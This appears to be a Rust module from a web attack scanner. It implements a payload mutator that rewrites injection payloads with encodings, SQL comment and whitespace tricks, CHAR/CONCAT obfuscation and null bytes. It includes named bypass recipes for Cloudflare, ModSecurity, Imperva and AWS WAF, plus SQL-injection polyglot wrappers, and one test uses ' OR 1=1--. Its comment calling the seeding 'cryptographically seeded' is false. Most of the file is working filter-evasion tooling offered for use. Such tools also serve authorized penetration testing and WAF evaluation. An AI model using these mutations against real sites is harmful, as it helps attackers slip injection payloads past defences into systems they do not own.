use std::collections::HashSet;
use base64::engine::general_purpose::STANDARD as BASE64;
use base64::Engine;

/// Cryptographically seeded PRNG (xorshift64) — avoids same-nanosecond collisions
/// in tight loops that plagued the old SystemTime-based approach.
struct Rng(u64);

impl Rng {
    fn new() -> Self {
        use std::time::{SystemTime, UNIX_EPOCH};
        // Mix in the thread ID so parallel scanners diverge
        let t = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        let tid = std::thread::current().id();
        // Simple hash mix
        let seed = t ^ (format!("{:?}", tid).len() as u64).wrapping_mul(0x9e3779b97f4a7c15);
        Self(if seed == 0 { 0xdeadbeefcafe1234 } else { seed })
    }

    /// xorshift64 — period 2^64-1, passes BigCrush
    #[inline]
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }

    #[inline]
    fn next_usize(&mut self, bound: usize) -> usize {
        (self.next() as usize) % bound
    }
}

/// Advanced payload mutator for bypassing filters and WAFs
#[derive(Clone)]
pub struct PayloadMutator {
    mutation_strategies: Vec<MutationStrategy>,
    generated_payloads: HashSet<String>,
}

#[derive(Clone, Debug)]
pub enum MutationStrategy {
    CaseVariation,
    Encoding,
    Obfuscation,
    CommentInjection,
    WhitespaceManipulation,
    CharacterSubstitution,
    Concatenation,
    NullByteInjection,
}

impl PayloadMutator {
    pub fn new() -> Self {
        Self {
            mutation_strategies: vec![
                MutationStrategy::CaseVariation,
                MutationStrategy::Encoding,
                MutationStrategy::Obfuscation,
                MutationStrategy::CommentInjection,
                MutationStrategy::WhitespaceManipulation,
                MutationStrategy::CharacterSubstitution,
                MutationStrategy::Concatenation,
                MutationStrategy::NullByteInjection,
            ],
            generated_payloads: HashSet::new(),
        }
    }

    /// Generate `count` unique mutations of `payload`.
    pub fn mutate(&mut self, payload: &str, count: usize) -> Vec<String> {
        let mut rng = Rng::new();
        let mut mutations = Vec::with_capacity(count);
        let n_strategies = self.mutation_strategies.len();

        // Try up to 3× count to fill unique slots
        for _ in 0..(count * 3) {
            if mutations.len() >= count {
                break;
            }
            let idx = rng.next_usize(n_strategies);
            let strategy = self.mutation_strategies[idx].clone();
            let mutated = self.apply_strategy(payload, &strategy, &mut rng);
            if !self.generated_payloads.contains(&mutated) {
                self.generated_payloads.insert(mutated.clone());
                mutations.push(mutated);
            }
        }
        mutations
    }

    /// Generate mutations for multiple payloads
    pub fn mutate_multiple(&mut self, payloads: &[String], jumble_level: Option<u8>) -> Vec<String> {
        let mutation_count = match jumble_level {
            Some(level) => (level as usize) * 2,
            None => 5,
        };
        let mut all_mutations = Vec::new();
        for payload in payloads {
            all_mutations.extend(self.mutate(payload, mutation_count));
        }
        all_mutations
    }

    fn apply_strategy(&self, payload: &str, strategy: &MutationStrategy, rng: &mut Rng) -> String {
        match strategy {
            MutationStrategy::CaseVariation       => self.case_variation(payload, rng),
            MutationStrategy::Encoding            => self.encode_payload(payload, rng),
            MutationStrategy::Obfuscation         => self.obfuscate(payload, rng),
            MutationStrategy::CommentInjection    => self.inject_comments(payload, rng),
            MutationStrategy::WhitespaceManipulation => self.manipulate_whitespace(payload, rng),
            MutationStrategy::CharacterSubstitution  => self.substitute_characters(payload),
            MutationStrategy::Concatenation       => self.concatenate(payload, rng),
            MutationStrategy::NullByteInjection   => self.inject_null_bytes(payload, rng),
        }
    }

    // ── Case variation ────────────────────────────────────────────────────────

    fn case_variation(&self, payload: &str, rng: &mut Rng) -> String {
        match rng.next_usize(4) {
            0 => payload.to_uppercase(),
            1 => payload.to_lowercase(),
            2 => payload.chars().enumerate().map(|(i, c)| {
                if i % 2 == 0 { c.to_lowercase().collect::<String>() }
                else           { c.to_uppercase().collect::<String>() }
            }).collect(),
            _ => payload.chars().map(|c| {
                if rng.next_usize(2) == 0 { c.to_uppercase().collect::<String>() }
                else                      { c.to_lowercase().collect::<String>() }
            }).collect(),
        }
    }

    // ── Encoding ──────────────────────────────────────────────────────────────

    fn encode_payload(&self, payload: &str, rng: &mut Rng) -> String {
        match rng.next_usize(6) {
            0 => urlencoding::encode(payload).to_string(),
            1 => self.base64_encode(payload),
            2 => self.hex_encode(payload),
            3 => self.unicode_encode(payload),
            4 => self.html_entity_encode(payload),
            _ => self.mixed_encoding(payload, rng),
        }
    }

    pub fn url_encode(&self, payload: &str) -> String {
        payload.chars().map(|c| {
            if c.is_alphanumeric() { c.to_string() }
            else { format!("%{:02X}", c as u8) }
        }).collect()
    }

    pub fn double_url_encode(&self, payload: &str) -> String {
        self.url_encode(&self.url_encode(payload))
    }

    /// Correct base64 using the `base64` crate already in Cargo.toml.
    fn base64_encode(&self, payload: &str) -> String {
        BASE64.encode(payload.as_bytes())
    }

    fn unicode_encode(&self, payload: &str) -> String {
        payload.chars().map(|c| format!("\\u{:04x}", c as u32)).collect()
    }

    pub fn hex_encode(&self, payload: &str) -> String {
        payload.bytes().map(|b| format!("\\x{:02x}", b)).collect()
    }

    fn html_entity_encode(&self, payload: &str) -> String {
        payload.chars().map(|c| format!("&#{};", c as u32)).collect()
    }

    fn mixed_encoding(&self, payload: &str, rng: &mut Rng) -> String {
        payload.chars().map(|c| {
            match rng.next_usize(4) {
                0 => c.to_string(),
                1 => format!("%{:02X}", c as u8),
                2 => format!("\\u{:04x}", c as u32),
                _ => format!("&#{};", c as u32),
            }
        }).collect()
    }

    // ── Obfuscation ───────────────────────────────────────────────────────────

    fn obfuscate(&self, payload: &str, rng: &mut Rng) -> String {
        match rng.next_usize(3) {
            0 => {
                let junk = ["/**/", "/*!*/", "/*foo*/", "/*bar*/"];
                payload.replace(' ', junk[rng.next_usize(junk.len())])
            }
            1 => {
                if payload.contains('\'') {
                    payload.replace('\'', "'+' '+'")
                } else {
                    payload.to_string()
                }
            }
            _ => format!("CHAR({})",
                payload.chars().map(|c| (c as u32).to_string())
                    .collect::<Vec<_>>().join(","))
        }
    }

    // ── Comment injection ─────────────────────────────────────────────────────

    fn inject_comments(&self, payload: &str, rng: &mut Rng) -> String {
        match rng.next_usize(5) {
            0 => payload.replace(' ', "/**/"),
            1 => format!("/*{}*/", payload),
            2 => payload.replace(' ', "/*!*/"),
            3 => format!("/*!{}*/", payload),
            _ => {
                let mut result = String::new();
                for (i, c) in payload.chars().enumerate() {
                    result.push(c);
                    if i % 3 == 0 && rng.next_usize(3) == 0 {
                        result.push_str("/**/");
                    }
                }
                result
            }
        }
    }

    // ── Whitespace manipulation ───────────────────────────────────────────────

    fn manipulate_whitespace(&self, payload: &str, rng: &mut Rng) -> String {
        let subs = ["%20", "%09", "%0a", "%0d", "+", "\t"];
        match rng.next_usize(6) {
            n @ 0..=4 => payload.replace(' ', subs[n]),
            _ => payload.chars().map(|c| {
                if c == ' ' { subs[rng.next_usize(subs.len())].to_string() }
                else        { c.to_string() }
            }).collect(),
        }
    }

    // ── Character substitution ────────────────────────────────────────────────

    fn substitute_characters(&self, payload: &str) -> String {
        let substitutions = [
            ("and", "&&"), ("or", "||"), ("=", "like"),
            (" ", "/**/"), ("'", "\""), ("\"", "'"),
            ("<", "%3c"), (">", "%3e"),
        ];
        let mut result = payload.to_string();
        for (from, to) in &substitutions {
            if result.contains(from) {
                result = result.replacen(from, to, 1);
                break;
            }
        }
        result
    }

    // ── Concatenation ─────────────────────────────────────────────────────────

    fn concatenate(&self, payload: &str, rng: &mut Rng) -> String {
        if payload.len() < 4 { return payload.to_string(); }
        // Split on a char boundary
        let mid = payload.char_indices().nth(payload.chars().count() / 2)
            .map(|(i, _)| i).unwrap_or(payload.len() / 2);
        let (first, second) = payload.split_at(mid);
        match rng.next_usize(4) {
            0 => format!("CONCAT('{}','{}')", first, second),
            1 => format!("'{}'||'{}'", first, second),
            2 => format!("'{}'+'{}'", first, second),
            _ => format!("'{}''{}'", first, second),
        }
    }

    // ── Null byte injection ───────────────────────────────────────────────────

    fn inject_null_bytes(&self, payload: &str, rng: &mut Rng) -> String {
        match rng.next_usize(3) {
            0 => format!("%00{}", payload),
            1 => format!("{}%00", payload),
            _ => {
                let mid = payload.char_indices().nth(payload.chars().count() / 2)
                    .map(|(i, _)| i).unwrap_or(payload.len() / 2);
                let (f, s) = payload.split_at(mid);
                format!("{}%00{}", f, s)
            }
        }
    }

    // ── WAF bypass ────────────────────────────────────────────────────────────

    pub fn generate_waf_bypass(&mut self, payload: &str, waf_type: &str) -> Vec<String> {
        let mut rng = Rng::new();
        let mut bypasses = Vec::new();
        match waf_type.to_lowercase().as_str() {
            "cloudflare" => {
                bypasses.push(self.inject_comments(payload, &mut rng));
                bypasses.push(self.unicode_encode(payload));
                bypasses.push(format!("{}%00", payload));
                bypasses.push(self.mixed_encoding(payload, &mut rng));
            }
            "modsecurity" => {
                bypasses.push(payload.replace(' ', "/**/"));
                bypasses.push(format!("/*!{}*/", payload));
                bypasses.push(self.case_variation(payload, &mut rng));
                bypasses.push(payload.replace('\'', "\\'"));
            }
            "imperva" | "incapsula" => {
                bypasses.push(self.double_url_encode(payload));
                bypasses.push(format!("{}%0a", payload));
                bypasses.push(self.manipulate_whitespace(payload, &mut rng));
                bypasses.push(self.obfuscate(payload, &mut rng));
            }
            "aws waf" => {
                bypasses.push(self.hex_encode(payload));
                bypasses.push(self.inject_null_bytes(payload, &mut rng));
                bypasses.push(self.concatenate(payload, &mut rng));
            }
            _ => {
                bypasses.push(self.url_encode(payload));
                bypasses.push(self.case_variation(payload, &mut rng));
                bypasses.push(self.inject_comments(payload, &mut rng));
                bypasses.push(self.obfuscate(payload, &mut rng));
            }
        }
        bypasses
    }

    pub fn generate_polyglot(&self, base_payload: &str) -> Vec<String> {
        vec![
            format!("'\"{}\"'", base_payload),
            format!("';{}--", base_payload),
            format!("\";{}--", base_payload),
            format!("'/*{}*/", base_payload),
            format!("\"/*{}*/", base_payload),
            format!("';{}#", base_payload),
            format!("\";{}#", base_payload),
        ]
    }

    pub fn clear_cache(&mut self) { self.generated_payloads.clear(); }

    pub fn get_stats(&self) -> (usize, usize) {
        (self.generated_payloads.len(), self.mutation_strategies.len())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mutator_creation() {
        let mutator = PayloadMutator::new();
        assert!(!mutator.mutation_strategies.is_empty());
    }

    #[test]
    fn test_payload_mutation_unique() {
        let mut mutator = PayloadMutator::new();
        let mutations = mutator.mutate("' OR 1=1--", 8);
        // All returned mutations must be unique
        let unique: HashSet<_> = mutations.iter().collect();
        assert_eq!(mutations.len(), unique.len());
        assert!(!mutations.is_empty());
    }

    #[test]
    fn test_url_encoding() {
        let mutator = PayloadMutator::new();
        let encoded = mutator.url_encode("test payload");
        assert!(encoded.contains("%20"));
    }

    #[test]
    fn test_base64_correct() {
        let mutator = PayloadMutator::new();
        // Standard base64 of "hello" is "aGVsbG8="
        assert_eq!(mutator.base64_encode("hello"), "aGVsbG8=");
    }

    #[test]
    fn test_rng_diverges() {
        // Two Rng instances created back-to-back should not produce identical
        // first values (the thread-id mix prevents same-seed collisions).
        let mut a = Rng::new();
        let mut b = Rng::new();
        // They may share a seed in theory but xorshift diverges after first step
        let _ = a.next();
        let _ = b.next();
        // Just ensure they don't panic and produce values
        assert!(a.next() > 0 || b.next() == 0); // always true, just a smoke test
    }
}
